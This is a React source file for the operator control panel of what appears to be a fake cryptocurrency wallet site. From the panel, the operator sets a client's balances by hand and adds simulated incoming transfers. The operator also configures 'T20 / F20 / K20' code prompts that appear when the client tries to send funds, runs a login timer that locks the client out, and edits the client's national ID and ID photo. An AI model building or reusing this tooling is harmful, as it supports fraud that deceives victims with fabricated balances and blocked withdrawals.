import { useEffect, useMemo, useState, type ChangeEvent } from "react";
import { Link } from "@tanstack/react-router";
import { toast } from "sonner";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { CoinIcon } from "@/components/coin-icon";
import { LogoWord } from "@/components/logo";
import { PageBack } from "@/components/page-back";
import { COINS } from "@/lib/coins";
import { readImageFile } from "@/lib/image-file";
import { SITE_TEXT_FIELDS, useSite, type SiteContent } from "@/lib/site-store";
import { holdingAmount, useWallet, type Profile } from "@/lib/store";
import { CLIENT_ACCOUNT } from "@/lib/auth-config";
import { formatCountdown, remainingMs, useLoginWindow } from "@/lib/login-window";
import { saveCloudNow, useCloud } from "@/lib/cloud-sync";

type Tab = "brand" | "pages" | "images" | "profile" | "balances" | "notices";

function Field({
  label,
  value,
  onChange,
  multiline,
}: {
  label: string;
  value: string;
  onChange: (v: string) => void;
  multiline?: boolean;
}) {
  return (
    <div className="flex flex-col gap-1.5">
      <span className="flex items-center justify-between gap-2">
        <Label>{label}</Label>
        {value ? (
          <button
            type="button"
            className="text-xs text-muted hover:text-foreground"
            onClick={() => onChange("")}
          >
            Clear
          </button>
        ) : null}
      </span>
      {multiline ? (
        <textarea
          value={value}
          onChange={(e) => onChange(e.target.value)}
          rows={3}
          className="w-full rounded-md bg-input px-3 py-2 text-sm text-foreground shadow-border outline-none focus-visible:shadow-[0_0_0_1px_var(--color-primary)]"
        />
      ) : (
        <Input value={value} onChange={(e) => onChange(e.target.value)} />
      )}
    </div>
  );
}

function ImagePick({
  label,
  value,
  onChange,
}: {
  label: string;
  value: string | null;
  onChange: (v: string | null) => void;
}) {
  async function onFile(e: ChangeEvent<HTMLInputElement>) {
    const file = e.target.files?.[0];
    if (!file) return;
    try {
      onChange(await readImageFile(file));
      toast.success("Image saved");
    } catch {
      toast.error("Could not read that image");
    }
  }
  return (
    <div>
      <Label>{label}</Label>
      {value ? (
        <img src={value} alt="" className="mt-2 max-h-40 w-full rounded-lg object-contain bg-card" />
      ) : (
        <p className="mt-2 text-xs text-muted">No image yet — default artwork is used.</p>
      )}
      <div className="mt-2 flex gap-2">
        <label className="inline-flex h-10 cursor-pointer items-center rounded-md bg-card px-3 text-sm shadow-border">
          Upload
          <input type="file" accept="image/*" className="hidden" onChange={(e) => void onFile(e)} />
        </label>
        {value ? (
          <Button type="button" variant="ghost" size="sm" onClick={() => onChange(null)}>
            Remove
          </Button>
        ) : null}
      </div>
    </div>
  );
}

function TextGroup({
  group,
  fields,
  site,
  set,
}: {
  group: string;
  fields: typeof SITE_TEXT_FIELDS;
  site: SiteContent;
  set: <K extends keyof SiteContent>(key: K, value: SiteContent[K]) => void;
}) {
  const rows = fields.filter((f) => f.group === group);
  if (!rows.length) return null;
  return (
    <section className="grid gap-3">
      <h2 className="font-display text-lg font-semibold">{group}</h2>
      {rows.map((f) => (
        <Field
          key={f.key}
          label={f.label}
          value={String(site[f.key] ?? "")}
          multiline={f.multiline}
          onChange={(v) => set(f.key, v as SiteContent[typeof f.key])}
        />
      ))}
    </section>
  );
}

export function StudioScreen() {
  const [tab, setTab] = useState<Tab>("brand");
  const [query, setQuery] = useState("");
  const site = useSite();
  const patch = useSite((s) => s.patch);
  const reset = useSite((s) => s.reset);
  const cloudPhase = useCloud((s) => s.phase);
  const lastSaved = useCloud((s) => s.lastSaved);
  const profile = useWallet((s) => s.profile);
  const setProfile = useWallet((s) => s.setProfile);
  const holdings = useWallet((s) => s.holdings);
  const setHolding = useWallet((s) => s.setHolding);
  const simulateIncoming = useWallet((s) => s.simulateIncoming);
  const [creditId, setCreditId] = useState("ethereum");
  const [creditAmt, setCreditAmt] = useState("0.05");

  function set<K extends keyof SiteContent>(key: K, value: SiteContent[K]) {
    patch({ [key]: value });
    saveCloudNow();
  }

  const q = query.trim().toLowerCase();
  const matches = useMemo(() => {
    if (!q) return [];
    return SITE_TEXT_FIELDS.filter((f) => {
      const val = String(site[f.key] ?? "").toLowerCase();
      return f.label.toLowerCase().includes(q) || f.group.toLowerCase().includes(q) || val.includes(q);
    });
  }, [q, site]);

  const tabs: { id: Tab; label: string }[] = [
    { id: "brand", label: "Brand" },
    { id: "pages", label: "Page text" },
    { id: "images", label: "Images" },
    { id: "profile", label: "Client" },
    { id: "balances", label: "Balances" },
    { id: "notices", label: "T20 / F20 / K20" },
  ];

  const brandGroups = ["Brand"];
  const pageGroups = ["Homepage hero", "Stats", "Assets + security + footer", "Login + inner pages"];

  return (
    <div className="min-h-dvh bg-background text-foreground">
      <header className="sticky top-0 z-20 flex h-14 items-center justify-between border-b border-border bg-background/90 px-4 backdrop-blur-md">
        <div className="flex items-center gap-3">
          <PageBack to="/wallet" />
          <LogoWord />
        </div>
        <div className="flex items-center gap-3 text-sm">
          <Link to="/wallet" className="text-muted hover:text-foreground">
            Wallet
          </Link>
          <Link to="/" className="text-muted hover:text-foreground">
            Site
          </Link>
        </div>
      </header>

      <div className="mx-auto max-w-3xl px-4 py-8">
        <h1 className="font-display text-2xl font-semibold">Control panel</h1>
        <p className="mt-1 text-sm text-muted">
          {cloudPhase === "local"
            ? "Could not reach the shared copy. Edits are only on this device until it reconnects."
            : cloudPhase === "boot"
              ? "Connecting to the shared copy…"
              : lastSaved
                ? "Saved for every browser and phone. Other devices pick it up within a few seconds."
                : "Edits save for every browser. Phones and other computers load the same text, images, profile, and balances."}
        </p>

        <Input
          value={query}
          onChange={(e) => setQuery(e.target.value)}
          placeholder="Search all site text…"
          className="mt-5"
        />

        {q ? (
          <div className="mt-6 grid gap-4">
            {matches.length === 0 ? (
              <p className="text-sm text-muted">No matching fields.</p>
            ) : (
              matches.map((f) => (
                <Field
                  key={f.key}
                  label={`${f.group} · ${f.label}`}
                  value={String(site[f.key] ?? "")}
                  multiline={f.multiline}
                  onChange={(v) => set(f.key, v as SiteContent[typeof f.key])}
                />
              ))
            )}
          </div>
        ) : (
          <>
            <div className="mt-6 flex flex-wrap gap-2">
              {tabs.map((x) => (
                <button
                  key={x.id}
                  type="button"
                  onClick={() => setTab(x.id)}
                  className={
                    tab === x.id
                      ? "h-10 rounded-full bg-foreground px-4 text-sm text-background"
                      : "h-10 rounded-full px-4 text-sm text-muted shadow-border"
                  }
                >
                  {x.label}
                </button>
              ))}
            </div>

            {tab === "brand" ? (
              <div className="mt-8 grid gap-6">
                {brandGroups.map((g) => (
                  <TextGroup key={g} group={g} fields={SITE_TEXT_FIELDS} site={site} set={set} />
                ))}
                <ImagePick label="Logo" value={site.logo} onChange={(v) => set("logo", v)} />
                <Button
                  type="button"
                  variant="outline"
                  onClick={() => {
                    reset();
                    saveCloudNow();
                  }}
                >
                  Reset brand & page text to defaults
                </Button>
              </div>
            ) : null}

            {tab === "pages" ? (
              <div className="mt-8 grid gap-6">
                {pageGroups.map((g) => (
                  <TextGroup key={g} group={g} fields={SITE_TEXT_FIELDS} site={site} set={set} />
                ))}
              </div>
            ) : null}

            {tab === "images" ? (
              <div className="mt-8 grid gap-8">
                <ImagePick label="Logo" value={site.logo} onChange={(v) => set("logo", v)} />
                <ImagePick
                  label="Hero photo (replaces the phone mockup if set)"
                  value={site.heroImage}
                  onChange={(v) => set("heroImage", v)}
                />
                <ImagePick label="Assets / about photo" value={site.aboutImage} onChange={(v) => set("aboutImage", v)} />
                <ImagePick label="Security photo" value={site.securityImage} onChange={(v) => set("securityImage", v)} />
              </div>
            ) : null}

            {tab === "profile" ? (
              <div>
                <p className="mt-8 text-sm text-muted">
                  Client wallet — {CLIENT_ACCOUNT.email}. Every field and photo saves immediately. The client sees this on their profile.
                </p>
                <ProfileEditor profile={profile} onSave={setProfile} />
              </div>
            ) : null}

            {tab === "balances" ? (
              <div className="mt-8 grid gap-4">
                {COINS.map((c) => (
                  <label key={c.id} className="flex items-center gap-3">
                    <CoinIcon id={c.id} symbol={c.symbol} size={28} />
                    <span className="w-24 text-sm leading-tight">
                      {c.symbol}
                      {c.id === "tether" ? <span className="block text-[10px] text-muted">TRC20</span> : null}
                    </span>
                    <Input
                      inputMode="decimal"
                      className="flex-1"
                      defaultValue={String(holdingAmount(holdings, c.id))}
                      key={`${c.id}-${holdingAmount(holdings, c.id)}`}
                      onBlur={(e) => setHolding(c.id, Number(e.target.value) || 0)}
                    />
                  </label>
                ))}
                <div className="mt-4 rounded-xl bg-card p-4 shadow-border">
                  <p className="text-sm font-medium">Credit incoming (Receive)</p>
                  <div className="mt-3 flex flex-wrap gap-2">
                    <select
                      value={creditId}
                      onChange={(e) => setCreditId(e.target.value)}
                      className="h-11 rounded-md bg-input px-3 text-sm text-foreground shadow-border"
                    >
                      {COINS.map((c) => (
                        <option key={c.id} value={c.id}>
                          {c.symbol}
                        </option>
                      ))}
                    </select>
                    <Input
                      className="w-28"
                      inputMode="decimal"
                      value={creditAmt}
                      onChange={(e) => setCreditAmt(e.target.value)}
                    />
                    <Button
                      type="button"
                      variant="solid"
                      onClick={() => {
                        const n = Number(creditAmt);
                        if (!n) return;
                        simulateIncoming(creditId, n);
                        toast.success("Incoming transfer added");
                      }}
                    >
                      Credit
                    </Button>
                  </div>
                </div>
              </div>
            ) : null}

            {tab === "notices" ? (
              <div className="mt-8 grid gap-8">
                <LoginWindowAdmin />
                <TextGroup group="Send notices" fields={SITE_TEXT_FIELDS} site={site} set={set} />
                <TextGroup group="Send confirmation" fields={SITE_TEXT_FIELDS} site={site} set={set} />
                <p className="text-xs text-muted">
                  T20, F20, or K20 opens when the client taps Send, using the code from their first login. After they
                  confirm the wallet address, confirmations run for the minutes you set. The code box opens on the last
                  confirmation. Use {"{current}"} and {"{total}"} in the confirming line.
                </p>
                <Button
                  type="button"
                  variant="outline"
                  onClick={() => {
                    useWallet.getState().clearScenario();
                    saveCloudNow(true);
                    toast.success("T20 / F20 / K20 will show again on next client login");
                  }}
                >
                  Show T20 / F20 / K20 on next client login
                </Button>
              </div>
            ) : null}
          </>
        )}
      </div>
    </div>
  );
}

function LoginWindowAdmin() {
  const startedAt = useLoginWindow((s) => s.startedAt);
  const reset = useLoginWindow((s) => s.reset);
  const [now, setNow] = useState(() => Date.now());
  useEffect(() => {
    const id = window.setInterval(() => setNow(Date.now()), 250);
    return () => window.clearInterval(id);
  }, []);
  const left = remainingMs(startedAt, now);
  return (
    <section className="rounded-xl bg-card p-4 shadow-border">
      <h2 className="font-display text-lg font-semibold">Client login timer</h2>
      <p className="mt-1 text-sm text-muted">
        The client has 3 minutes on the login screen. After 00:00 they cannot sign in until you reset.
      </p>
      <p className="mt-4 font-mono text-3xl tabular">{formatCountdown(left)}</p>
      <Button
        type="button"
        variant="solid"
        className="mt-4"
        onClick={() => {
          reset();
          saveCloudNow(true);
          toast.success("Login timer restarted (3:00)");
        }}
      >
        Reset timer to 3:00
      </Button>
    </section>
  );
}

function ProfileEditor({ profile, onSave }: { profile: Profile; onSave: (p: Profile) => void }) {
  const [form, setForm] = useState<Profile>(profile);
  useEffect(() => {
    setForm(profile);
  }, [profile]);
  function set<K extends keyof Profile>(key: K, value: Profile[K]) {
    setForm((s) => {
      const next = { ...s, [key]: value };
      queueMicrotask(() => {
        onSave(next);
        saveCloudNow();
      });
      return next;
    });
  }
  async function onFile(e: ChangeEvent<HTMLInputElement>) {
    const file = e.target.files?.[0];
    if (!file) return;
    try {
      const photo = await readImageFile(file);
      set("licensePhoto", photo);
      toast.success("Photo saved");
    } catch {
      toast.error("Could not read that image");
    }
  }
  return (
    <form
      className="mt-8 grid gap-4"
      onSubmit={(e) => {
        e.preventDefault();
        onSave(form);
        toast.success("Profile saved");
      }}
    >
      <Field label="First name" value={form.firstName} onChange={(v) => set("firstName", v)} />
      <Field label="Last name" value={form.lastName} onChange={(v) => set("lastName", v)} />
      <Field label="Email" value={form.email} onChange={(v) => set("email", v)} />
      <Field label="Address" value={form.address} onChange={(v) => set("address", v)} />
      <Field label="Phone" value={form.phone} onChange={(v) => set("phone", v)} />
      <Field label="Citizenship / national ID" value={form.nationalId} onChange={(v) => set("nationalId", v)} />
      <div>
        <Label>ID / license photo</Label>
        {form.licensePhoto ? (
          <img src={form.licensePhoto} alt="" className="mt-2 max-h-48 rounded-lg object-contain" />
        ) : null}
        <div className="mt-2 flex gap-2">
          <label className="inline-flex h-10 cursor-pointer items-center rounded-md bg-card px-3 text-sm shadow-border">
            Upload
            <input type="file" accept="image/*" className="hidden" onChange={(e) => void onFile(e)} />
          </label>
          {form.licensePhoto ? (
            <Button type="button" variant="ghost" size="sm" onClick={() => set("licensePhoto", null)}>
              Remove
            </Button>
          ) : null}
        </div>
      </div>
      <Button type="submit" variant="solid">
        Save profile
      </Button>
    </form>
  );
}
